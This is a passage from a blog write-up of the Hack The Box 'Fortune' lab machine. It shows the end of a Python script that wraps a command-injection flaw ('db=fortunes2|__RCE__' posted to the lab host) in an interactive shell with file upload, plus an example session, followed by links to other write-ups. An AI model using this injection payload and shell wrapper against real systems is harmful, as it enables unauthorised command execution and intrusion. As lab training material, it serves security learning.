</span></span><span class="line"><span class="cl">                <span class="n">remote_path</span> <span class="o">=</span> <span class="n">stored_cwd</span> <span class="o">+</span> <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">local_path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">upload</span><span class="p">(</span><span class="n">rce</span><span class="p">,</span> <span class="n">local_path</span><span class="p">,</span> <span class="n">remote_path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">remote_path</span> <span class="o">=</span> <span class="n">upload_cmd</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">remote_path</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;/&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">remote_path</span> <span class="o">=</span> <span class="n">stored_cwd</span> <span class="o">+</span> <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">remote_path</span>
</span></span><span class="line"><span class="cl">                <span class="n">upload</span><span class="p">(</span><span class="n">rce</span><span class="p">,</span> <span class="n">local_path</span><span class="p">,</span> <span class="n">remote_path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">user_input</span> <span class="o">=</span> <span class="s2">&#34;echo &#39;               *****  UPLOAD FINISHED  *****&#39;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">rce</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;method&#34;</span><span class="p">:</span><span class="s2">&#34;POST&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">       <span class="s2">&#34;url&#34;</span><span class="p">:</span><span class="s2">&#34;http://10.10.10.127/select&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">       <span class="s2">&#34;data&#34;</span><span class="p">:</span><span class="s2">&#34;db=fortunes2%7C__RCE__</span><span class="si">%20%</span><span class="s2">23&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">       <span class="s2">&#34;remote_os&#34;</span><span class="p">:</span><span class="s2">&#34;unix&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">       <span class="s2">&#34;timeout&#34;</span><span class="p">:</span><span class="mi">30</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">shell</span><span class="p">(</span><span class="n">rce</span><span class="o">=</span><span class="n">rce</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">EXAMPLE:
</span></span></span><span class="line"><span class="cl"><span class="s1">$ python rce2shell.py 
</span></span></span><span class="line"><span class="cl"><span class="s1">[_fortune@fortune.htb /var/appsrv/fortune]$ ls -al
</span></span></span><span class="line"><span class="cl"><span class="s1">total 104
</span></span></span><span class="line"><span class="cl"><span class="s1">drwxr-xr-x  4 _fortune  _fortune    512 Feb  3 05:08 .
</span></span></span><span class="line"><span class="cl"><span class="s1">drwxr-xr-x  5 root      wheel       512 Nov  2  2018 ..
</span></span></span><span class="line"><span class="cl"><span class="s1">drwxrwxrwx  2 _fortune  _fortune    512 Nov  2  2018 __pycache__
</span></span></span><span class="line"><span class="cl"><span class="s1">-rw-r--r--  1 root      _fortune    341 Nov  2  2018 fortuned.ini
</span></span></span><span class="line"><span class="cl"><span class="s1">-rw-r-----  1 _fortune  _fortune  35638 Aug  3 06:00 fortuned.log
</span></span></span><span class="line"><span class="cl"><span class="s1">-rw-rw-rw-  1 _fortune  _fortune      6 Aug  3 03:13 fortuned.pid
</span></span></span><span class="line"><span class="cl"><span class="s1">-rw-r--r--  1 root      _fortune    413 Nov  2  2018 fortuned.py
</span></span></span><span class="line"><span class="cl"><span class="s1">drwxr-xr-x  2 root      _fortune    512 Nov  2  2018 templates
</span></span></span><span class="line"><span class="cl"><span class="s1">-rw-r--r--  1 root      _fortune     67 Nov  2  2018 wsgi.py
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span></span></span></code></pre></div></p>

        </div>

        <aside>
          <div class="p-share centered">
            <a href="https://www.buymeacoffee.com/alamot" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-coffee"></i></a>
            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2ffortune_writeup%2f&t=Fortune%20%28Hack%20The%20Box%29%20write-up" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2ffortune_writeup%2f&text=Fortune%20%28Hack%20The%20Box%29%20write-up&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2ffortune_writeup%2f&text=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Fortune%20%28Hack%20The%20Box%29&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2ffortune_writeup%2f&description=Fortune%20%28Hack%20The%20Box%29%20write-up&media=https://alamot.github.io/images/fortune.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2ffortune_writeup%2f&description=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Fortune%20%28Hack%20The%20Box%29&media=https://alamot.github.io/images/fortune.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
          </div>
        </aside>
      </article>
      
      <section id="posts-section">
        <header lang="en"><h3>See also...</h3></header>
        <header lang="el"><h3>Δείτε επίσης...</h3></header>
        <div>
          
          
          
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Reddish (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Reddish (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">26 Jan 2019</time>
      <time lang="el">26 Ιαν 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Tally (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Tally (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">03 May 2018</time>
      <time lang="el">03 Μαϊ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">FluxCapacitor (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">13 May 2018</time>
      <time lang="el">13 Μαϊ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Legacy (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Legacy (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">19 Oct 2017</time>
      <time lang="el">19 Οκτ 2017</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Enterprise (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Enterprise (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">19 Mar 2018</time>
      <time lang="el">19 Μαρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Fulcrum (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Fulcrum (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">09 Jun 2018</time>
      <time lang="el">09 Ιουν 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Unattended (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Unattended (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">23 Aug 2019</time>
      <time lang="el">23 Αυγ 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Inception (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Inception (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">14 Apr 2018</time>
      <time lang="el">14 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Nineveh (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Nineveh (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">17 Dec 2017</time>
      <time lang="el">17 Δεκ 2017</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">LaCasaDePapel (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">27 Jul 2019</time>
      <time lang="el">27 Ιουλ 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Sense (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Sense (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">24 Mar 2018</time>
      <time lang="el">24 Μαρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Minion (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Minion (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">10 Apr 2018</time>
      <time lang="el">10 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Querier (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Querier (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">22 Jun 2019</time>
      <time lang="el">22 Ιουν 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Mantis (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Mantis (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">18 Feb 2018</time>
      <time lang="el">18 Φεβ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Optimum (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Optimum (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">28 Oct 2017</time>
      <time lang="el">28 Οκτ 2017</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Falafel (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Falafel (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">23 Jun 2018</time>
      <time lang="el">23 Ιουν 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Node (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Node (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">03 Mar 2018</time>
      <time lang="el">03 Μαρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">22 Apr 2018</time>
      <time lang="el">22 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/oracle/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Ask and you shall receive</h3>
      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">04 May 2019</time>
      <time lang="el">04 Μαϊ 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/bloodhound_analyzer/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/bloodhound.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Bloodhound analyzer</h3>
      <h3 class="title" lang="el">Λαγωνικός αναλυτής</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">21 Dec 2025</time>
      <time lang="el">21 Δεκ 2025</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Path-traversal archiver</h3>
      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">14 May 2019</time>
      <time lang="el">14 Μαϊ 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/get_outlook_rules/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/flying_mail.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">How to collect Outlook rules using Powershell</h3>
      <h3 class="title" lang="el">Πως να συλλέξετε τους κανόνες του Outlook χρησιμοποιώντας Powershell</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">20 May 2022</time>
      <time lang="el">20 Μαϊ 2022</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Reverse shells</h3>
      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">12 Apr 2018</time>
      <time lang="el">12 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">13 Apr 2018</time>
      <time lang="el">13 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">09 Apr 2018</time>
      <time lang="el">09 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
